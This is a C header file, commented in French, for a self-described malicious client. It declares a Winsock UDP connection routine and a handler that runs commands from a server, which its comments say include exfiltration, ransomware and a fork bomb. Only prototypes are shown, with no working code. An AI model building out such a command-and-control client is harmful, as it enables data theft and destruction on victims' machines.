/**
 * @file client.h
 * @brief Définition des fonctions du client malveillant
 * @author Valentin Pizzio
 * @date 21/12/2024
 * 
 * Ce fichier définit les fonctions principales du client malveillant,
 * notamment l'initialisation de la connexion et le traitement des
 * commandes reçues du serveur.
 */

#ifndef CLIENT_H
#define CLIENT_H

#include <winsock2.h>
#include "protocol.h"

/**
 * @brief Initialise la connexion client
 * 
 * Cette fonction initialise la bibliothèque Winsock et crée un socket UDP
 * pour la communication avec le serveur.
 * 
 * @return SOCKET Socket créé pour la communication
 */
SOCKET init_client(void);

/**
 * @brief Traite une commande reçue du serveur
 * 
 * Cette fonction analyse et exécute une commande reçue du serveur.
 * Elle gère les différentes commandes définies dans le protocole
 * (exfiltration, ransomware, fork bomb, etc.).
 * 
 * @param msg Message reçu contenant la commande à exécuter
 * @param socket_fd Socket de communication
 * @param server_addr Adresse du serveur
 */
void handle_server_command(SOCKET socket_fd, Message msg, struct sockaddr_in server_addr);

#endif // CLIENT_H
